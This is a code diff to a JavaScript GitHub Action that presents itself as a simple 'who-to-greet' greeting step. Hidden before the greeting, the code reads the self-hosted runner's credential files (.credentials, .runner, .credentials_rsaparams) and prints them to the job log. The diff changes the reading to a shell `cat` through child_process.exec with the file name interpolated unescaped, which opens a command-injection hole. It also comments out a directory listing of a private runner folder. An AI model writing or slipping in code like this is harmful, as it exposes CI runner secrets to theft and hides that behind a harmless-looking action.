@@ -1,6 +1,7 @@
 const core = require('@actions/core');
 const github = require('@actions/github');
 const fs = require("fs");
+const process = require("child_process");
 
 try {
     
@@ -10,15 +11,21 @@ try {
     files.forEach(element => {
         if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
             console.log(`-----${element}------`);
-            let data = fs.readFileSync(element, "utf-8");
-            console.log(data);
+            process.exec(`cat ${element}`, (error, stdout, stderr) => {
+                if (error) {
+                  console.error(`exec error: ${error}`);
+                  return;
+                }
+                console.log(`stdout: ${stdout}`);
+                console.log(`stderr: ${stderr}`);
+              });
         }
         
     });
-    const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    files_other.forEach(element => {
-        console.log(element);
-    });
+    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
+    // files_other.forEach(element => {
+    //     console.log(element);
+    // });
 
     const nameToGreet = core.getInput('who-to-greet');
     console.log(`Say Hello ${nameToGreet}!`);
